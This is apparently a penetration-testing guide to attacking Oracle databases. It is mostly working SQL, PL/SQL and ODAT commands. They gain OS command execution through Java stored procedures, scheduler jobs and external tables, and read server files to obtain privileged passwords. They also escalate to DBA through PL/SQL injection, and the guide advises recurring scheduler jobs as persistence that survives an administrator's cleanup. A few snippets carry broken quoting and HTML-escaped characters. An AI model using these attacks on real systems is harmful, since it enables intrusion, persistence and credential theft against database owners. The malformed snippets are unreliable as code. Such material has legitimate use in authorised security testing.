# Oracle RCE & more

## RCE: Java Store Procedure

So, imagine that you have the administrator account information. In this case, a very popular way to execute your command on the server is to write a ‘java stored’ procedure. This is done in three stages. First, create a Java class called ‘oraexec’. To do this, connect via ‘sqlplus’ terminal and write:

```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
  public class oraexec
  {
    public static void execCommand(String command) throws IOException
    {
      Runtime.getRuntime().exec(command);
    }
  }
/
 
```

Next, write a PL/SQL wrapper for this class:

```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```

That’s it. Now, to execute a command, all you need is just to send the following query:

```text
exec javacmd('command');
```

Note that when using the above procedure, we cannot see the results of executed command, however, you can redirect the output to a file and read it. You can find the full code of the shell that allows to read and write files:

{% file src="../../.gitbook/assets/raptor\_oraexec.sql" %}

However, there is a \[more sophisticated script\] \(goo.gl/EuwPRU\) that handles the command output, but it has a larger size [here](https://oracle-base.com/articles/8i/shell-commands-from-plsql).

## RCE: Scheduler

The next method, which will help us if there is no Java virtual machine, is to use ‘dbmsscheduler’, the built-in task scheduler of Oracle. To use it, you must have the privilege ‘CREATE EXTERNAL JOB’. Here’s a code sample that implements the entry of ‘0wned’ string into a text file in the root of the C: drive:

```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE); 
```

This will create and run a job for executing your command. And here’s an option for calling the Scheduler from another procedure – ‘SYS.KUPP$PROC.CREATE\_MASTER\_PROCESS’, which is of interest to us, primarily, because it allows you to embed multi-statement queries, that is, those consisting of multiple sub-queries. Theoretically, you can run such query even in case of injection into a web application.

```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```

Note that, when you use the Scheduler, you can run this job more than once and do it with some frequency. As a result, this will help you get a foothold in the tested system, because, even if the administrator deletes the user from OS, this job, which is regularly running in the system, will bring him or her back to life.

## RCE: External Tables

As the last method for achieving the execution of OS commands, I would like to mention the use of External Tables. This method will help you later download files from the server. You will need the following privileges:

* UTL\_FILE;
* CREATE TABLE;
* a directory reserved for the user.

Let’s remember that the access to ‘UTL\_FILE’ package is by default provided to all accounts with ‘CONNECT’ role. Step one: Check the issued directories with the following query:

```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;
 
TABLE_NAME
------------------------------
ALICE_DIR
```

Step two: Create an executable batch file with desired command:

```text
declare
 f utl_file.file_type;
 s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
 f := utl_file.fopen('ALICE_DIR','test.bat','W');
 utl_file.put_line(f,s);
 utl_file.fclose(f);
end;
/
```

Step three: Prepare the external table ‘EXTT’, you will need it to run the file:

```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
  DEFAULT DIRECTORY ALICE_DIR
  ACCESS PARAMETERS
  ( RECORDS DELIMITED BY NEWLINE
    FIELDS TERMINATED BY ',')
  LOCATION (alice_dir:'test.bat'))
/
```

Now, just call your batch file with the following command:

```text
SELECT * from EXTT;
```

The terminal will start to display error messages that the system cannot match the table and invoked file but, in this case, it is not important, as the main objective was to open the executable file, which you have achieved.

‘ODAT.py’ utility also can implement this attack. However, it requires the privilege ‘CREATE ANY DIRECTORY’, which, by default, is granted only to DBA role, since it attempts to execute the file from any and not only “your” directory.

## Read/Write files

Now, let’s proceed to the task of reading and writing the files. If you simply need to read or write a file to the server, you can do it without any Java procedures, which, however, can also handle such tasks. Let’s have a look into ‘UTL\_FILE’ package that has the functionality required for working with the file system. The good news is that, by default, it can be accessed by all users with ‘PUBLIC’ role. The bad news is that, by default, this procedure has no access to the entire file system, but only to a directory pre-defined by the administrator. However, it is not uncommon to find a directory parameter specified as ‘\*’, which literally means “access to everything.” You can find this out by using the following command:

```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```

I found that the shortest procedure for using ‘UTL\_FILE’ package is proposed by Alexander Polyakov:

```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/’,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/
 
```

If you need more functionality with the ability to write, I recommend to google a script called ‘raptor\_oraexec.sql’. And according to tradition, here’s an option for using ‘ODAT’ utility, which, as always, is the shortest:

```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```

‘UTL\_FILE’ package is also very interesting because if you’re lucky, you can reach the logs, configuration files and obtain passwords from privileged accounts, such as ‘SYS’.

The second method that I would like to mention is to use again the ‘External Tables’. Remember that, when using ‘External Tables’, the database can access in read mode the data from external tables. For a hacker, this means yet another opportunity to download files from the server, but this method requires ‘CREATE ANY DIRECTORY’ privilege. I suggest immediately using ‘ODAT’, as it is stable and fast:

```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```

## Elevating Privileges

You can use various methods to elevate privileges, ranging from classic buffer overflows and DLL patching to specialized attacks against databases, such as PL/SQL injections. The topic is very extensive and, in this article, I will not dwell on it, as this is discussed in large research papers, such as those found in the blogs of \[Lichfield\] \(goo.gl/IebQN4\) and \[Finnigan\] \(goo.gl/vXhttf\). I will just demonstrate some of them, so that you have a general idea. During the testing, I recommend simply paying attention to current privileges and, based on this, search for desired loopholes in the Internet.

Unlike MS SQL, where an attacker can inject ‘xp\_cmdshell’ almost immediately after ‘SELECT’ by simply closing it with a quotation mark, Oracle DB flatly rejects such tricks. For this reason, we cannot every time resort to classical SQL injections although, in this case, too, it is possible to find a way out. We will consider PL/SQL injections, which are modifying the process of executing a procedure \(function, trigger, and other objects\) by embedding random commands into available input parameters. \(с\) Sh2kerr

In order to embed the payload, find a function where the input parameters are not filtered. Remember that Oracle SQL does not allow multi-statement \(multiple\) queries, therefore, most likely, you will need to use some “special” procedures that have this feature. The main idea behind the attack is as follows: By default, unless specified otherwise, the procedure is executed on behalf of the owner and not on behalf of the user who started it. In other words, if a procedure owned by ‘SYS’ account is available for execution and you can embed your code into it, your payload will also be executed in the context of ‘SYS’ account. As I already mentioned, this is not what happens always, as there are procedures with ‘authid current\_user’ parameter, which means that this procedure will be executed with privileges of the current user. However, usually in each version, you can find some functions that are vulnerable to PL/ SQL injection. A general view of this process is shown in Fig. 2.

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

In short, instead of expected legitimate argument, we pass some malicious code that becomes a part of procedure. A good example is provided by ‘CTXSYS.DRILOAD’ function. It is executed on behalf of ‘CTXSYS’ and does not filter the input parameter, which allows you to easily rise up to DBA:

```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```

However, by now, this is probably history, since the vulnerability was found in 2004, and it affects only the old versions 8–9. Usually, the process of escalating the privileges is divided into two parts: writing the procedure that increases the rights and performing the injection itself. A typical procedure is as follows:

```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```

Now we can inject a procedure as an argument of vulnerable function \(example for versions 10x\):

```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 –-');
```

In the not too recent versions 10 and 11, there is one “nice” exception, or rather a vulnerability, that allows you to execute commands on the server without having DBA rights: ‘DBMS\_JVM\_EXP\_PERMS’ procedure allows a user with ‘CREATE SESSION’ privilege to get ‘JAVA IO’ rights. The attack can be mounted as follows:

```text
SQL&gt; DECLARE
   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
   CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
  BEGIN
  OPEN C1;
  FETCH C1 BULK COLLECT INTO POL;
  CLOSE C1;
  DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
  END;
  /
 
PL/SQL procedure successfully completed.
```

Now that you have the privileges to call up Java procedures, you can evoke a response from the Windows interpreter and execute something:

```text
SQL&gt; select dbms_java.runjava(‘oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack’)from dual;
```



